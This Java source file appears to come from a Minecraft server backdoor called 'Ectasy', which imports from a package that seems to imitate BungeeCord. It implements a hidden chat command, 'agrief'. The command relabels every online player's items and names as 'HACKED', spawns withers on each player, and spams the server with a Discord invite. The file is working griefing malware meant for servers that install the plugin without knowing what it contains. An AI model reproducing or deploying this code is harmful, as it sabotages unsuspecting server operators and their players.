package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import java.util.Arrays;
import java.util.Collections;

import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

@CommandInfo(
   name = "agrief",
   description = "Mess up stuff && announce ectasy grief",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class AnnounceGriefCommand extends AbstractCommand {

   @Override
   public void execute(AsyncPlayerChatEvent e, String var2, String[] args) {
      for(Player player : Bukkit.getOnlinePlayers()) {
         for(ItemStack is : player.getInventory().getContents()) {
            if (is != null && is.getType() != null && !is.getType().equals(Material.AIR)) {
               ItemMeta meta = is.getItemMeta();
               meta.setDisplayName("§6§kxx§4§l HACKED §6§kxxx§f");
               meta.setLore(Collections.singletonList("§4complain at " + Ectasy.discordInviteLink));
               is.setItemMeta(meta);
               is.setDurability((short) 0);
            }
         }

         player.updateInventory();
         player.setDisplayName("§6§kxxx§4§l HACKED §6§kxxx§f");
         player.setPlayerListName("§6§kxxx§4§l HACKED §6§kxxx§f");
         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
            for (int i = 0; i < 3; i++) {
               Entity wither = player.getWorld().spawnEntity(player.getLocation(), EntityType.WITHER);
               wither.setCustomName("§4§lHACKED complain at " + Ectasy.discordInviteLink);
               wither.setCustomNameVisible(true);
            }
         });
      }

      for (int i = 0; i < 20; i++) {
         Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&6&kxxx&f &4&lhacked, complain at " + Ectasy.discordInviteLink + " &6&kxxx&f"));
      }
   }
}
